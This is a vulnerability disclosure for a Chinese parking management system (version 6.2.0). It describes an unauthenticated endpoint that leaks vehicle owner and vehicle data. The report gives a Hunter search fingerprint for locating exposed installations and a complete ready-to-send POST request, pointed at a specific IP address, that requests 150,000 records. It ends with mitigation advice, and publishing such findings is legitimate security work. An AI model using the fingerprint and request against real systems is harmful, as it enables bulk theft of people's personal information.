[PRODUCT]

停车场管理系统 6.2.0

![image-20260122184037465](https://raw.githubusercontent.com/jiecoke/daaaaaaaaaaaaaaasdd/refs/heads/main/1.assets/image-/image-20260122184037465.png)

Vendor website : http://221.7.133.9:18011/#/login



[TYPE]

Unauthorized Access Vulnerability



[DESCRIPTION]

The Das Parking Management System is vulnerable to unauthorized access. This unauthenticated endpoint allows any caller to read system files from the server's filesystem, thereby exposing sensitive data.



[Fingerprint]

Hunter :  web.title=="DasPmsWeb" and web.body="assets/images/loginLogo.png"

![image-20260126173642888](https://raw.githubusercontent.com/jiecoke/daaaaaaaaaaaaaaasdd/refs/heads/main/1.assets/image-/image-20260126173642888.png)



[DETAILS]

Request package is as follows

```
POST /vehicleOwner/search HTTP/1.1
Host: 222.85.157.145
Accept: application/json, text/plain, */*
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN
Connection: keep-alive
Content-Type: application/json
OprtNo: 
Connection: keep-alive
Content-Length: 158

{"pagingModel":{"pageSize":150000,"pageIndex":1},"sortModel":{"field":"","orderType":0},"filterModel":{"ownerName":"","phone":"","dptName":"","ownerCode":""}}
```

The request packet returns data, and the content varies depending on the system configuration. In some cases, it exposes personal information; in others, it leaks vehicle-related data.

![image-20260126174751024](https://raw.githubusercontent.com/jiecoke/daaaaaaaaaaaaaaasdd/refs/heads/main/1.assets/image-/image-20260126174751024.png)



[Mitigation & Fix Recommendations]

Immediately add mandatory identity verification logic to the interface, adopting mature authentication methods such as JWT tokens or Session sessions. Requests that fail the verification shall directly return a `401 Unauthorized` status code. Meanwhile, filter the returned content of the interface on an as-needed basis, retaining only the fields necessary for business operations, and implement desensitization or encryption measures for core sensitive data (e.g., phone numbers, ID card numbers). In addition, configure access frequency limits at the application layer and enable operation log auditing, which records key information such as the visitor’s IP address and request time to detect and block abnormal access behaviors in a timely manner.

